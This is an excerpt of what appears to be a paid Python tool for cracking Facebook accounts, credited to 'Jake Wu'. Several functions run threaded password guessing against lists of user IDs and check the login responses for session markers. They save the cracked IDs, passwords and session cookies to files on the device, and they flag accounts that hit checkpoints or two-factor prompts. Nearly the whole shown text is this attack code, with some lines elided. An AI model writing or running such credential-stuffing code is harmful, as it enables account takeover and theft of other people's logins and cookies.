...
\033[1;37m-----------------------------------------------
\033[1;37m AUTHOR    : \033[92;1m Jake Wu•
\033[1;37m Facebook Link   : \033[92;1m facebook.com/100090514260120
\033[1;37m VERSION   : \033[92;1m1\033[92;1m.\033[92;1m0
\033[1;37m STATUS.  : \033[92;1m  PAID
\033[92;1m ═══════════════════════════════════════════════
\033[92;1m   Tool by Jake Wu
\033[92;1m ═══════════════════════════════════════════════""")   
                ...
                if x == ("***"):
                        ...
                        if xd in ['1','01']:
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print("\033[1;37m CRACKING PLEASE WAIT....ON\033[1;37m")
                                        line()
                                        for user in fo:
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mJake\x1b[1;92m-\x1b[1;92mM3\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aws:
                                ...
                                print('\r\r\033[1;32m [Jakey-OK] %s | %s'%(ids,pas))
                                open('/sdcard/Jakey-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/Jakey-OK-COOKiE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')

                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aws:
                                if 'y' in pcp:
                                        #print('\r\r\x1b[38;5;208m [Jake-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Jake-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api1(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mJakey\x1b[1;92m-\x1b[1;92mM1\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()        
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                uid = str(po['uid'])
                                print('\r\r\033[1;32m [Jakey-OK] '+uid+' | '+pas+'|'+asha(uid)+'\033[1;32m')                                
                                ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                                cookies = f"sb={ssbb};{ckkk}"
                                #print('\033[1;37m [🍪] Cookies :- '+cookies)
                                open('/sdcard/Jakey-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
                                oks.append(uid)
                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                uid = str(po['error']['error_data']['uid'])
                                #print(f'\r\r\033[1;33m [Jake-CP] '+uid+' | '+pas+'\033[1;97m')
                                open('/sdcard/Jake-CP.txt','a').write(uid+'|'+pas+'\n')
                                cps.append(uid)
                                break
                        else:
                                continue
...
def rd(ids,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mJake\x1b[1;92m-\x1b[1;92mXD\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()                
                for pas in passlist:                                          
                        ...
                        if 'session_key' in po:
                                ...
                                cookies = f"sb={ssbb};{ckkk}"
                                print('\033[1;37m [🍪] Cookies :- '+cookies)                                                                                                                                                
                                open('/sdcard/Jake-R-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')                                                          
                                oks.append(uid)
                                ...
                                uid = str(po['error']['error_data']['uid'])
                                #print(f'\r\r\033[1;33m [Jake-CP] '+uid+' | '+pas+'\033[1;97m')
                                open('/sdcard/Jake-R-CP.txt','a').write(uid+'|'+pas+'\n')
                                cps.append(uid)
                                break
                        else:
                                continue
...
def bd1(ids,passlist):
    ...
    'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m [Jakey-OK] '+ids+' | '+ps)                
                print('\033[1;37m [🍪] Cookies :- '+coki)                
                open('/sdcard/Jake-BD-OK.txt', 'a').write( ids+' | '+ps+' | '+coki+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print(f'\r\r\033[1;33m [Jake-CP] '+ids+' | '+ps+'\033[1;97m')
                open('/sdcard/Jake-BD-CP.txt', 'a').write( ids+' | '+ps+' \n')
                cps.append(cid)
            elif twf in session.cookies.get_dict().keys():
                print('\033[1;93m\033[0;34mJake-2F '+ids+' • '+ps+'  \033[0;97m')
                break
            else:
                continue
        loop+=1
...
def newidx(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mJakey\x1b[1;92m-\x1b[1;92mM2\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()        
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
